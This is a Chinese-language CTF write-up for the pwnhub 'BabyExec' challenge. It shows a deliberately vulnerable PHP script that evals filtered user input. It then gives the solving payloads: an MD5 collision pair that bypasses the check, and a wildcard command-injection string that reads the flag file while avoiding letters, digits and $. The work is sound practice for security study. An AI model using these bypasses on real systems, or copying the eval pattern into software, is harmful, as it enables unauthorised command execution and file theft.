# pwnhub公开赛-【迎中秋】BabyExec



没有注册码，刷一个，首先分析源代码。

<pre class="wp-block-code"><code>&lt;?php
error_reporting(0);
highlight_file(__FILE__);
if ((string)$_GET&#91;'x'] !== (string)$_GET&#91;'y'] && md5($_GET&#91;'x']) === md5($_GET&#91;'y'])) { 
	if(!isset($_GET&#91;'shell'])){ 
    	echo "Attack me!";  } 
    else {   
    	$shell = $_GET&#91;'shell'];    
    	if(!preg_match("/&#91;a-zA-Z0-9_$@]+/",$shell)){      
    		eval($shell);    } 
    	else {      
    		die('No,No,No! Keep it up......');    
        }  }}
else {  die("No, way!");}
?></code></pre>
 `(string)$_GET['x'] !== (string)$_GET['y'] && md5($_GET['x']) === md5($_GET['y']` 需要md5强碰撞来绕过。参照之前代码审计的学习。构造payload如下：

```
x=%14%97%3DYd%EF%AC%9BF%FF%12%16%0AL%FA%1E9wi%C9r%9F%3D%AA%2C%F6x%B1%93.%10%A0%60%CB%BB%09%F2%0D.%29%CF%25%CB%FA%DBw4rH%D6%1B%8A%23%11%7C%D5%D8G%DE%8F%19%7C%8D%BEd%C0C%D6x%91%D3%02G7/%E47%0C%1B%FA%9E%A7%40%F9%12%3B%A0%20%C9%7B%F5%C4%D1%19Y%A2%B7F%17%E20%DCrS%CF%B0%C0%EFr~W%E6%0A%E8%93KS%1E%F7%F0%CA%9A%3Bf%2AQ%05%EC
&y=%14%97%3DYd%EF%AC%9BF%FF%12%16%0AL%FA%1E9wiIr%9F%3D%AA%2C%F6x%B1%93.%10%A0%60%CB%BB%09%F2%0D.%29%CF%25%CB%FA%DB%F74rH%D6%1B%8A%23%11%7C%D5%D8G%DE%0F%19%7C%8D%BEd%C0C%D6x%91%D3%02G7/%E47%0C%1B%FA%9E%A7%40y%12%3B%A0%20%C9%7B%F5%C4%D1%19Y%A2%B7F%17%E20%DCrS%CF%B0%C0%EFr%FEV%E6%0A%E8%93KS%1E%F7%F0%CA%9A%3B%E6%2AQ%05%EC
```


<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-58.png" alt="" class="wp-image-3675" width="766" height="363" /> </figure> 

然后是无数字字母的命令执行，还绕过了`_$@`。

<pre class="wp-block-code"><code>采用通配符绕过美元符号（$）
shell=?>&lt;?=`/???/??? /????`?>
或者
shell=?%3E%3C?=`/???/???%20/????`?%3E</code></pre>

在底部发现flag<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-59.png" alt="" class="wp-image-3676" width="696" height="303" /> </figure>
